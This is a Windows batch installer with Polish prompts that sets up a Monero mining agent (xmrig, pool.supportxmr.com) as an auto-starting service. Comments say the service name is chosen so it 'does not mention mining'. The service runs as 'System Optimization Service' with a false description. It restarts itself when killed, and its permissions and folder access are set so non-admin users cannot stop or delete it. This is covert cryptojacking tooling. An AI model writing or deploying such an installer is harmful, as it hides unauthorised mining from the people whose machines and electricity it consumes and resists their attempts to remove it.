@echo off
chcp 65001 >nul
echo.
echo  ╔══════════════════════════════════════╗
echo  ║     Agent — Instalator Windows       ║
echo  ╚══════════════════════════════════════╝
echo.

net session >nul 2>&1
if errorlevel 1 (
    echo  BŁĄD: Uruchom jako Administrator
    pause & exit /b 1
)

set /p SERVER_URL=Adres serwera (np. http://192.168.1.10:8000):
set /p POOL=Pool (Enter = pool.supportxmr.com:3333):
if "%POOL%"=="" set POOL=pool.supportxmr.com:3333
set /p WALLET=Adres portfela XMR:
set /p XMRIG=Ścieżka do xmrig.exe (Enter = xmrig):
if "%XMRIG%"=="" set XMRIG=xmrig

:: Internal service name — neutral, does not mention mining
set SVC_NAME=SysOptSvc
set SVC_DISPLAY=System Optimization Service
set INSTALL_DIR=C:\SysOptSvc

mkdir "%INSTALL_DIR%" 2>nul
copy /y agent.py              "%INSTALL_DIR%\" >nul
copy /y wol_setup.py          "%INSTALL_DIR%\" >nul
copy /y hardware_detect.py    "%INSTALL_DIR%\" >nul

(
echo RM_SERVER_URL=%SERVER_URL%
echo RM_POOL=%POOL%
echo RM_WALLET=%WALLET%
echo RM_XMRIG_PATH=%XMRIG%
echo RM_INTERVAL=10
) > "%INSTALL_DIR%\agent.env"

echo  Instaluję zależności...
pip install psutil requests GPUtil --quiet

:: Remove old instance if exists
sc stop  %SVC_NAME% >nul 2>&1
sc delete %SVC_NAME% >nul 2>&1

:: Create service with neutral display name
sc create %SVC_NAME% binPath= "pythonw.exe \"%INSTALL_DIR%\agent.py\"" start= auto DisplayName= "%SVC_DISPLAY%"
sc description %SVC_NAME% "Manages system optimization and background performance tasks."

:: Failure recovery — restart immediately if killed/crashed
sc failure %SVC_NAME% reset= 0 actions= restart/1000/restart/1000/restart/1000

:: Restrict stop/delete permissions for non-admin users
sc sdset %SVC_NAME% "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"

:: Lock the install directory — only SYSTEM and admins can modify files
icacls "%INSTALL_DIR%" /inheritance:r /grant:r "NT AUTHORITY\SYSTEM:(OI)(CI)F" "BUILTIN\Administrators:(OI)(CI)F" >nul 2>&1

sc start %SVC_NAME%

echo.
echo  ✓ Instalacja zakończona!
echo  ✓ Usługa: %SVC_NAME% (%SVC_DISPLAY%)
echo  ✓ Katalog: %INSTALL_DIR%
echo.
pause
